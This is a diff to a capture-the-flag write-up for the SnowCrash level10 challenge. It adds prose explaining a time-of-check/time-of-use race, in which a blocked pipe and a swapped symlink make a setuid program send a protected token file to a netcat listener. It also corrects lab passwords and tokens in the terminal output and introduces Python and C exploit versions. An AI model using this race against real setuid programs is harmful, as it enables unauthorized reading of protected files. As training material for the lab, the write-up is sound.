@@ -155,6 +155,8 @@ Connecting to 127.0.0.1:6969 .. Connected!
 Sending file .. wrote file!
 ```
 
+The race won: the listener receives the content of `token` instead of our harmless decoy file.
+
 ```sh
 level10@SnowCrash:~$ nc -kl 6969
 .*( )*.
@@ -162,11 +164,8 @@ woupa2yuojeeaaed06riuj63c
 ```
 
 ```sh
-flag11@SnowCrash:~$ getflag
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
-
 level10@SnowCrash:~$ su - flag10
-Password: # fa6v5ateaw21peobuub8ipe6s
+Password: # woupa2yuojeeaaed06riuj63c
 Don't forget to launch getflag !
 flag10@SnowCrash:~$ getflag
 Check flag.Here is your token : feulo4b72j7edeahuete3no7c
@@ -177,6 +176,8 @@ level11@SnowCrash:~$
 ```
 
 ### Exploits
+
+Two versions of the same race are given below: the Python script used above, and an equivalent C implementation. Both rely on the same idea: fill the pipe `level10` writes to so its `write()` call blocks right after the `access()` check succeeds, swap the checked path for a symlink to `token` while it's stuck, then drain the pipe so it resumes and unknowingly serves the protected file.
 
 ```py
 #!/usr/bin/env python
@@ -234,8 +235,7 @@ if __name__ == "__main__":
     main()
 ```
 
-
-
+The C version below does the same thing without relying on a separate Python process: it `dup2`s its own stdin/stdout, clogs the pipe directly, `fork`s, then lets the parent swap the symlink and release the pipe once the child (running `./level10`) is observed to be stuck on `write()`.
 
 ```c
 #define _GNU_SOURCE
